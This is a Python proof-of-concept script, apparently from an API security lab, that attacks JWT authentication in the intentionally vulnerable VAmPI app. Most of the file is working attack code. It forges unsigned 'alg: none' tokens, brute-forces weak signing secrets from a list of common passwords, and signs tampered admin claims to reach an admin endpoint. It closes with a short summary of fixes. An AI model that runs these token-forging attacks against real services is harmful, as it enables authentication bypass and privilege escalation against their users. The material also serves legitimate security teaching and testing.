#!/usr/bin/env python3
"""
JWT Attack Toolkit — Broken Authentication PoC
Target: VAmPI — /users/v1/login

Attacks covered:
    1. Algorithm confusion (alg: none)
    2. Weak secret brute-force
    3. Claim tampering (privilege escalation)

Usage:
    python3 jwt_attacks.py --token <JWT> [--secret <known_secret>]
    python3 jwt_attacks.py --vampi-url http://localhost:5000 --auto

Author: Ronald Maboufotso | API Security Lab
"""

import argparse
import base64
import json
import hmac
import hashlib
import requests
import sys
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()

COMMON_SECRETS = [
    "secret", "secret1234", "password", "admin", "jwt_secret",
    "mysecret", "changeme", "supersecret", "qwerty", "12345",
    "letmein", "token_secret", "api_secret", "app_secret"
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decode JWT without verification. Returns (header, payload, signature)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_none_alg(payload: dict) -> str:
    """
    Attack 1: Algorithm Confusion — alg: none
    Sets algorithm to 'none', removes signature.
    Bypasses verification on misconfigured servers.
    """
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."   # Empty signature


def forge_hs256(header: dict, payload: dict, secret: str) -> str:
    """
    Attack 2 / 3: Sign a token with a known or discovered secret.
    Used after brute-forcing the secret key.
    """
    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def brute_force_secret(token: str, wordlist: list[str]) -> str | None:
    """
    Attack 2: Brute-force weak JWT signing secret.
    Tests common secrets and wordlist entries.
    """
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = b64url_decode(parts[2])

    for secret in wordlist:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if sig == expected_sig:
            return secret
    return None


def test_endpoint(base_url: str, token: str, path: str) -> tuple[int, str]:
    """Test a forged token against an endpoint."""
    resp = requests.get(
        f"{base_url}{path}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10
    )
    return resp.status_code, resp.text


def run_auto(vampi_url: str):
    """Full automated attack chain against VAmPI."""
    console.print(Panel.fit(
        "[bold red]JWT Attack Toolkit[/bold red]\n"
        "[dim]OWASP API2:2023 — Broken Authentication[/dim]",
        border_style="red"
    ))

    # Step 1 — Get a valid token
    console.print("\n[bold]Step 1:[/bold] Obtaining valid JWT via login...")
    resp = requests.post(
        f"{vampi_url}/users/v1/login",
        json={"username": "name1", "password": "pass1"},
        timeout=10
    )
    if resp.status_code != 200:
        console.print(f"  [yellow]Login failed ({resp.status_code}). Initialize VAmPI first:[/yellow]")
        console.print(f"  [dim]curl -s {vampi_url}/createdb[/dim]")
        sys.exit(1)

    token = resp.json().get("auth_token")
    console.print(f"  ✅ Token: [dim]{token[:60]}...[/dim]")

    # Decode it
    header, payload, _ = decode_jwt(token)
    console.print(f"\n  Header:  {json.dumps(header)}")
    console.print(f"  Payload: {json.dumps(payload)}")

    # Step 2 — Test alg:none bypass
    console.print("\n[bold]Step 2:[/bold] Testing alg:none bypass (Attack 1)...")
    evil_payload = dict(payload)
    evil_payload["admin"] = True
    evil_payload["username"] = "admin"

    none_token = forge_none_alg(evil_payload)
    status, body = test_endpoint(vampi_url, none_token, "/users/v1/admin/users")

    if status == 200:
        console.print(Panel(
            f"[red]🚨 ALG:NONE BYPASS CONFIRMED[/red]\n\n"
            f"Forged token:  [yellow]{none_token[:60]}...[/yellow]\n"
            f"Endpoint:      /users/v1/admin/users\n"
            f"Response code: [red]{status}[/red]\n"
            f"Response body: [dim]{body[:200]}[/dim]",
            border_style="red", title="API2:2023 — Broken Authentication"
        ))
    else:
        console.print(f"  [green]✅ alg:none rejected (HTTP {status})[/green]")

    # Step 3 — Brute-force secret
    console.print("\n[bold]Step 3:[/bold] Brute-forcing JWT signing secret...")
    found_secret = brute_force_secret(token, COMMON_SECRETS)

    if found_secret:
        console.print(f"  [red]🚨 WEAK SECRET FOUND: '{found_secret}'[/red]")

        # Forge admin token with real signature
        forged_token = forge_hs256(dict(header), evil_payload, found_secret)
        status, body = test_endpoint(vampi_url, forged_token, "/users/v1/admin/users")
        console.print(f"  Forged admin token response: HTTP {status}")

        if status == 200:
            console.print("  [red]🚨 PRIVILEGE ESCALATION CONFIRMED via forged token[/red]")
    else:
        console.print("  [green]✅ Secret not in common wordlist (use jwt_tool -C -d rockyou.txt for full brute)[/green]")

    # Step 4 — Summary
    console.print("\n[bold]Finding Summary:[/bold]")
    console.print("""
  Vulnerability:  Broken Authentication — JWT Algorithm Confusion + Weak Secret
  OWASP:          API2:2023
  Severity:       Critical (CVSS 9.1)
  Attacks:
    1. alg:none   — Server accepts unsigned tokens (no signature verification)
    2. Brute-force — Signing secret is a common dictionary word
    3. Escalation  — Any of the above allow crafting admin-level tokens
  Fix:
    - Pin algorithm server-side (never read from token header)
    - Use cryptographically random secrets (≥256 bits)
    - Use RS256 (asymmetric) for distributed systems
    """)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT Attack Toolkit")
    parser.add_argument("--vampi-url", default="http://localhost:5000")
    parser.add_argument("--token", help="Existing JWT to analyze")
    parser.add_argument("--secret", help="Known secret to test signing with")
    parser.add_argument("--auto", action="store_true",
                        help="Run automated attack chain against VAmPI")
    args = parser.parse_args()

    if args.auto or not args.token:
        run_auto(args.vampi_url)
    elif args.token:
        header, payload, sig = decode_jwt(args.token)
        console.print(f"Header:  {json.dumps(header, indent=2)}")
        console.print(f"Payload: {json.dumps(payload, indent=2)}")
        if args.secret:
            forged = forge_hs256(header, payload, args.secret)
            console.print(f"\nForged token (HS256, secret='{args.secret}'):\n{forged}")
